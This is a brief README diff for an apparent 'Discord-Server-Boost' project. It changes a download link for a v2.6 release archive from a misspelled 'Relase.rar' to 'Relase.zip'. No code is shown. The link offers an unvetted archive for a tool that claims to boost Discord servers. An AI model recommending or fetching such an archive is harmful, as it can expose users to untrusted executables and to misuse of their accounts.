@@ -10,7 +10,7 @@
 </p>
 
 ## Download
-🚀 Install --> [Releases](https://github.com/deorpa/Discord-Server-Boost/releases/download/v2.6/Relase.rar)
+🚀 Install --> [Releases](https://github.com/deorpa/Discord-Server-Boost/releases/download/v2.6/Relase.zip)
 
 
 # Last update: 
